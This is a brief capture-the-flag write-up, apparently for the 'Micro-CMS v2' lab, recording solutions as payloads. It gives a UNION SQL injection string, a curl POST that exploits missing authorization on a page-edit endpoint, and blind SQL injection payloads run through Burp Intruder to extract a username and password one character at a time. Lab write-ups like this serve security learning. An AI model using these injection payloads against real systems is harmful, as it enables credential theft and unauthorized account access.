# Micro-CMS v2


1. UNION-based SQL Injection
    ```
    ' UNION SELECT '' WHERE '1'='1' #
    ```
    and it still didn't makes any sense to me

3. Lack of authorization on the HTTP post method
   ```
   curl -X POST <url>/page/edit/1
   ```
4. Blind SQL Injection with conditional responses

   - first I try find out the response given from the server. I try `' OR 1=1 #` on username inputfield and it return **Invalid password**. 
   - then make sure there is a _username_ columns with `' OR LENGTH(username)>1 #` followed by looking for the right length by modifying the operator and the value.
   - setting up a burpsuite intruder, on username input `' OR ASCII(SUBSTR(username, 1, 1)) = §ascii§ #`, set payload with 26 of lowercase ASCII alphabets. Then repeat after the response say Invalid password until we found all pieces..
   - for password is the same as the username but modify a bit so it look like `' OR LENGTH(password)>1 #` and `' OR ASCII(SUBSTR(password, 1, 1)) = §ascii§ #` 
   - then we can login as that user.
